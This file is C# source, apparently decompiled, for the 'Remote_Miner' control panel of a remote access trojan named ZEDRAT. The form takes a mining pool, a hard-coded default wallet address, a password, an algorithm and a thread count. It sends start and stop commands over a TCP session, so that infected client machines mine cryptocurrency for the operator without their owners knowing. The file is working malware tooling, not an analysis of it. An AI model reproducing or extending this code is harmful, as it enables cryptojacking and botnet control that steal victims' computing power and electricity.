using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using ns1;
using ns2;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.TCP;
using ZEDRatApp.ZEDRAT.Messages;
using TextBox = ns2.TextBox;

namespace ZEDRatApp.Forms
{
	public class Remote_Miner : Form
	{
		private TcpClientSession _tcs;

		private IContainer components;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private BunifuSeparator bunifuSeparator1;

		private SiticoneControlBox siticoneControlBox1;

		private SiticoneLabel siticoneLabel12;

		private SiticoneRoundedTextBox txtWallet;

		private SiticoneRoundedTextBox txtPool;

		private SiticoneLabel siticoneLabel2;

		private SiticoneLabel siticoneLabel1;

		private SiticoneRoundedButton btnStart;

		private SiticoneRoundedButton btnStop;

		private SiticoneRoundedTextBox txtPass;

		private SiticoneLabel siticoneLabel3;

		private Guna2NumericUpDown ThreadsUpDown;

		private SiticoneLabel siticoneLabel5;

		private SiticoneLabel siticoneLabel4;

		private Guna2ComboBox Algorithm;

		private Guna2HtmlLabel guna2HtmlLabel1;

		private Guna2HtmlLabel guna2HtmlLabel2;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_Miner(string tital, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			this.Text = tital;
		}

		private void Remote_Miner_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				try
				{
					this._tcs?._Idispatchar?.Unregister(DataType.RemoteHydraMinerType);
				}
				catch
				{
				}
				this._tcs.Client_Send(DataType.RemoteHydraMinerType, Serializable.Serialize(new RemoteHydraMiner_Messages
				{
					Status = "StopMiner"
				}));
			}
			catch
			{
			}
			finally
			{
				this._tcs = null;
			}
		}

		private void btnStart_Click(object sender, EventArgs e)
		{
			try
			{
				RemoteHydraMiner_Messages remoteHydraMiner_Messages = new RemoteHydraMiner_Messages();
				if (string.IsNullOrEmpty(((TextBox)this.txtPool).Text))
				{
					this.guna2HtmlLabel2.Text = "You need a pool to start";
					return;
				}
				((Control)(object)this.btnStart).Enabled = false;
				remoteHydraMiner_Messages.Status = "StartMiner";
				remoteHydraMiner_Messages.PoolPort = ((TextBox)this.txtPool).Text;
				remoteHydraMiner_Messages.Wallet = ((TextBox)this.txtWallet).Text;
				remoteHydraMiner_Messages.Pass = ((TextBox)this.txtPass).Text;
				remoteHydraMiner_Messages.Algo = this.Algorithm.Text;
				remoteHydraMiner_Messages.Threads = this.ThreadsUpDown.Value.ToString();
				this._tcs.Client_Send(DataType.RemoteHydraMinerType, Serializable.Serialize(remoteHydraMiner_Messages));
			}
			catch
			{
			}
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			try
			{
				this._tcs.Client_Send(DataType.RemoteHydraMinerType, Serializable.Serialize(new RemoteHydraMiner_Messages
				{
					Status = "StopMiner"
				}));
			}
			catch
			{
			}
		}

		public void UpdateStatusForm(TcpClientSession ts, byte[] bt)
		{
		}

		private void Remote_Miner_Load(object sender, EventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Register(DataType.RemoteHydraMinerType, new Action<TcpClientSession, byte[]>(UpdateStatusForm));
			}
			catch
			{
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																																																											this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_Miner));
			this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.siticoneControlBox1 = new SiticoneControlBox();
			this.siticoneLabel12 = new SiticoneLabel();
			this.txtWallet = new SiticoneRoundedTextBox();
			this.txtPool = new SiticoneRoundedTextBox();
			this.siticoneLabel2 = new SiticoneLabel();
			this.siticoneLabel1 = new SiticoneLabel();
			this.btnStart = new SiticoneRoundedButton();
			this.btnStop = new SiticoneRoundedButton();
			this.txtPass = new SiticoneRoundedTextBox();
			this.siticoneLabel3 = new SiticoneLabel();
			this.Algorithm = new Guna.UI2.WinForms.Guna2ComboBox();
			this.siticoneLabel4 = new SiticoneLabel();
			this.siticoneLabel5 = new SiticoneLabel();
			this.ThreadsUpDown = new Guna.UI2.WinForms.Guna2NumericUpDown();
			this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
			this.guna2HtmlLabel2 = new Guna.UI2.WinForms.Guna2HtmlLabel();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			((System.ComponentModel.ISupportInitialize)this.ThreadsUpDown).BeginInit();
			base.SuspendLayout();
			this.guna2BorderlessForm1.ContainerControl = this;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-12, 52);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(5, 2, 5, 2);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(570, 10);
			this.bunifuSeparator1.TabIndex = 87;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.siticoneControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.siticoneControlBox1.BorderRadius = 12;
			this.siticoneControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.siticoneControlBox1.HoveredState.Parent = (ControlBox)(object)this.siticoneControlBox1;
			this.siticoneControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Location = new System.Drawing.Point(491, 12);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Name = "siticoneControlBox1";
			this.siticoneControlBox1.PressedColor = System.Drawing.Color.Red;
			this.siticoneControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticoneControlBox1;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).TabIndex = 86;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Location = new System.Drawing.Point(208, 21);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Name = "siticoneLabel12";
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Size = new System.Drawing.Size(100, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).TabIndex = 84;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Text = "Remote Port";
			((SiticoneTextBox)this.txtWallet).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtWallet).Cursor = System.Windows.Forms.Cursors.IBeam;
			((TextBox)this.txtWallet).DefaultText = "3NsptyRdJg2n6SJ5cpEu7PZMQLaGMaffkJ";
			((SiticoneTextBox)this.txtWallet).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			((SiticoneTextBox)this.txtWallet).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			((SiticoneTextBox)this.txtWallet).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtWallet).DisabledState.Parent = (TextBox)(object)this.txtWallet;
			((SiticoneTextBox)this.txtWallet).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtWallet).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((SiticoneTextBox)this.txtWallet).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtWallet).FocusedState.Parent = (TextBox)(object)this.txtWallet;
			((SiticoneTextBox)this.txtWallet).HoveredState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtWallet).HoveredState.Parent = (TextBox)(object)this.txtWallet;
			((System.Windows.Forms.Control)(object)this.txtWallet).Location = new System.Drawing.Point(132, 128);
			((System.Windows.Forms.Control)(object)this.txtWallet).Name = "txtWallet";
			((TextBox)this.txtWallet).PasswordChar = '\0';
			((SiticoneTextBox)this.txtWallet).PlaceholderText = "";
			((TextBox)this.txtWallet).SelectedText = "";
			((SiticoneTextBox)this.txtWallet).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtWallet;
			((System.Windows.Forms.Control)(object)this.txtWallet).Size = new System.Drawing.Size(342, 24);
			((System.Windows.Forms.Control)(object)this.txtWallet).TabIndex = 91;
			((SiticoneTextBox)this.txtPool).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtPool).Cursor = System.Windows.Forms.Cursors.IBeam;
			((TextBox)this.txtPool).DefaultText = "stratum+tcp://scrypt.eu-north.nicehash.com:3333";
			((SiticoneTextBox)this.txtPool).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			((SiticoneTextBox)this.txtPool).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			((SiticoneTextBox)this.txtPool).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtPool).DisabledState.Parent = (TextBox)(object)this.txtPool;
			((SiticoneTextBox)this.txtPool).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtPool).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((SiticoneTextBox)this.txtPool).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtPool).FocusedState.Parent = (TextBox)(object)this.txtPool;
			((SiticoneTextBox)this.txtPool).HoveredState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtPool).HoveredState.Parent = (TextBox)(object)this.txtPool;
			((System.Windows.Forms.Control)(object)this.txtPool).Location = new System.Drawing.Point(132, 98);
			((System.Windows.Forms.Control)(object)this.txtPool).Name = "txtPool";
			((TextBox)this.txtPool).PasswordChar = '\0';
			((SiticoneTextBox)this.txtPool).PlaceholderText = "";
			((TextBox)this.txtPool).SelectedText = "";
			((SiticoneTextBox)this.txtPool).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtPool;
			((System.Windows.Forms.Control)(object)this.txtPool).Size = new System.Drawing.Size(342, 24);
			((System.Windows.Forms.Control)(object)this.txtPool).TabIndex = 90;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel2.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Location = new System.Drawing.Point(62, 136);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Name = "siticoneLabel2";
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Size = new System.Drawing.Size(36, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).TabIndex = 89;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Text = "Wallet:";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Location = new System.Drawing.Point(62, 103);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Name = "siticoneLabel1";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Size = new System.Drawing.Size(27, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).TabIndex = 88;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Text = "Pool:";
			((SiticoneButton)this.btnStart).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnStart).BorderThickness = 1;
			((SiticoneButton)this.btnStart).CheckedState.Parent = (CustomButtonBase)(object)this.btnStart;
			((SiticoneButton)this.btnStart).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnStart).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			((SiticoneButton)this.btnStart).CustomImages.Parent = (CustomButtonBase)(object)this.btnStart;
			((SiticoneButton)this.btnStart).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnStart).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnStart).ForeColor = System.Drawing.Color.White;
			((SiticoneButton)this.btnStart).HoveredState.Parent = (CustomButtonBase)(object)this.btnStart;
			((System.Windows.Forms.Control)(object)this.btnStart).Location = new System.Drawing.Point(62, 276);
			((System.Windows.Forms.Control)(object)this.btnStart).Name = "btnStart";
			((SiticoneButton)this.btnStart).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnStart;
			((System.Windows.Forms.Control)(object)this.btnStart).Size = new System.Drawing.Size(91, 26);
			((System.Windows.Forms.Control)(object)this.btnStart).TabIndex = 93;
			((System.Windows.Forms.Control)(object)this.btnStart).Text = "Start";
			((System.Windows.Forms.Control)(object)this.btnStart).Click += new System.EventHandler(btnStart_Click);
			((SiticoneButton)this.btnStop).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnStop).BorderThickness = 1;
			((SiticoneButton)this.btnStop).CheckedState.Parent = (CustomButtonBase)(object)this.btnStop;
			((SiticoneButton)this.btnStop).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnStop).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			((SiticoneButton)this.btnStop).CustomImages.Parent = (CustomButtonBase)(object)this.btnStop;
			((SiticoneButton)this.btnStop).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnStop).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnStop).ForeColor = System.Drawing.Color.White;
			((SiticoneButton)this.btnStop).HoveredState.Parent = (CustomButtonBase)(object)this.btnStop;
			((System.Windows.Forms.Control)(object)this.btnStop).Location = new System.Drawing.Point(383, 276);
			((System.Windows.Forms.Control)(object)this.btnStop).Name = "btnStop";
			((SiticoneButton)this.btnStop).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnStop;
			((System.Windows.Forms.Control)(object)this.btnStop).Size = new System.Drawing.Size(91, 26);
			((System.Windows.Forms.Control)(object)this.btnStop).TabIndex = 92;
			((System.Windows.Forms.Control)(object)this.btnStop).Text = "Stop";
			((System.Windows.Forms.Control)(object)this.btnStop).Click += new System.EventHandler(btnStop_Click);
			((SiticoneTextBox)this.txtPass).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtPass).Cursor = System.Windows.Forms.Cursors.IBeam;
			((TextBox)this.txtPass).DefaultText = "x";
			((SiticoneTextBox)this.txtPass).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			((SiticoneTextBox)this.txtPass).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			((SiticoneTextBox)this.txtPass).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtPass).DisabledState.Parent = (TextBox)(object)this.txtPass;
			((SiticoneTextBox)this.txtPass).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtPass).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((SiticoneTextBox)this.txtPass).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtPass).FocusedState.Parent = (TextBox)(object)this.txtPass;
			((SiticoneTextBox)this.txtPass).HoveredState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtPass).HoveredState.Parent = (TextBox)(object)this.txtPass;
			((System.Windows.Forms.Control)(object)this.txtPass).Location = new System.Drawing.Point(132, 158);
			((System.Windows.Forms.Control)(object)this.txtPass).Name = "txtPass";
			((TextBox)this.txtPass).PasswordChar = '\0';
			((SiticoneTextBox)this.txtPass).PlaceholderText = "";
			((TextBox)this.txtPass).SelectedText = "";
			((SiticoneTextBox)this.txtPass).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtPass;
			((System.Windows.Forms.Control)(object)this.txtPass).Size = new System.Drawing.Size(342, 24);
			((System.Windows.Forms.Control)(object)this.txtPass).TabIndex = 95;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel3.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Location = new System.Drawing.Point(62, 169);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Name = "siticoneLabel3";
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Size = new System.Drawing.Size(52, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).TabIndex = 94;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Text = "Password:";
			this.Algorithm.AutoRoundedCorners = true;
			this.Algorithm.BackColor = System.Drawing.Color.Transparent;
			this.Algorithm.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Algorithm.BorderRadius = 17;
			this.Algorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			this.Algorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.Algorithm.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.Algorithm.FocusedColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Algorithm.FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Algorithm.FocusedState.Parent = this.Algorithm;
			this.Algorithm.Font = new System.Drawing.Font("Century Gothic", 10f);
			this.Algorithm.ForeColor = System.Drawing.Color.White;
			this.Algorithm.HoverState.Parent = this.Algorithm;
			this.Algorithm.ItemHeight = 30;
			this.Algorithm.Items.AddRange(new object[10] { "cryptonight", "scrypt", "sha256d", "keccak", "quark", "heavy", "skein", "shavite3", "blake", "x11" });
			this.Algorithm.ItemsAppearance.Parent = this.Algorithm;
			this.Algorithm.Location = new System.Drawing.Point(132, 188);
			this.Algorithm.Name = "Algorithm";
			this.Algorithm.ShadowDecoration.Parent = this.Algorithm;
			this.Algorithm.Size = new System.Drawing.Size(140, 36);
			this.Algorithm.TabIndex = 96;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel4.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Location = new System.Drawing.Point(62, 202);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Name = "siticoneLabel4";
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Size = new System.Drawing.Size(49, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).TabIndex = 97;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Text = "Algorithm:";
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel5.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Location = new System.Drawing.Point(62, 235);
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Name = "siticoneLabel5";
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Size = new System.Drawing.Size(45, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).TabIndex = 98;
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Text = "Threads:";
			this.ThreadsUpDown.AutoRoundedCorners = true;
			this.ThreadsUpDown.BackColor = System.Drawing.Color.Transparent;
			this.ThreadsUpDown.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ThreadsUpDown.BorderRadius = 17;
			this.ThreadsUpDown.Cursor = System.Windows.Forms.Cursors.IBeam;
			this.ThreadsUpDown.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			this.ThreadsUpDown.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			this.ThreadsUpDown.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			this.ThreadsUpDown.DisabledState.Parent = this.ThreadsUpDown;
			this.ThreadsUpDown.DisabledState.UpDownButtonFillColor = System.Drawing.Color.FromArgb(177, 177, 177);
			this.ThreadsUpDown.DisabledState.UpDownButtonForeColor = System.Drawing.Color.FromArgb(203, 203, 203);
			this.ThreadsUpDown.FillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.ThreadsUpDown.FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ThreadsUpDown.FocusedState.Parent = this.ThreadsUpDown;
			this.ThreadsUpDown.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.ThreadsUpDown.ForeColor = System.Drawing.Color.FromArgb(126, 137, 149);
			this.ThreadsUpDown.Location = new System.Drawing.Point(132, 230);
			this.ThreadsUpDown.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
			this.ThreadsUpDown.Name = "ThreadsUpDown";
			this.ThreadsUpDown.ShadowDecoration.Parent = this.ThreadsUpDown;
			this.ThreadsUpDown.Size = new System.Drawing.Size(100, 36);
			this.ThreadsUpDown.TabIndex = 99;
			this.ThreadsUpDown.UpDownButtonFillColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.ThreadsUpDown.UpDownButtonForeColor = System.Drawing.Color.White;
			this.ThreadsUpDown.UseTransparentBackground = true;
			this.ThreadsUpDown.Value = new decimal(new int[4] { 1, 0, 0, 0 });
			this.guna2HtmlLabel1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.guna2HtmlLabel1.BackColor = System.Drawing.Color.Transparent;
			this.guna2HtmlLabel1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.guna2HtmlLabel1.Location = new System.Drawing.Point(12, 318);
			this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
			this.guna2HtmlLabel1.Size = new System.Drawing.Size(36, 15);
			this.guna2HtmlLabel1.TabIndex = 100;
			this.guna2HtmlLabel1.Text = "Status:";
			this.guna2HtmlLabel2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.guna2HtmlLabel2.BackColor = System.Drawing.Color.Transparent;
			this.guna2HtmlLabel2.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2HtmlLabel2.Location = new System.Drawing.Point(55, 318);
			this.guna2HtmlLabel2.Name = "guna2HtmlLabel2";
			this.guna2HtmlLabel2.Size = new System.Drawing.Size(37, 15);
			this.guna2HtmlLabel2.TabIndex = 101;
			this.guna2HtmlLabel2.Text = "Started";
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(548, 342);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.guna2HtmlLabel2);
			base.Controls.Add(this.guna2HtmlLabel1);
			base.Controls.Add(this.ThreadsUpDown);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel5);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel4);
			base.Controls.Add(this.Algorithm);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtPass);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel3);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnStart);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnStop);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtWallet);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtPool);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel1);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel12);
			this.ForeColor = System.Drawing.Color.White;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_Miner";
			this.Text = "Remote_Miner";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_Miner_FormClosed);
			base.Load += new System.EventHandler(Remote_Miner_Load);
			((System.ComponentModel.ISupportInitialize)this.ThreadsUpDown).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
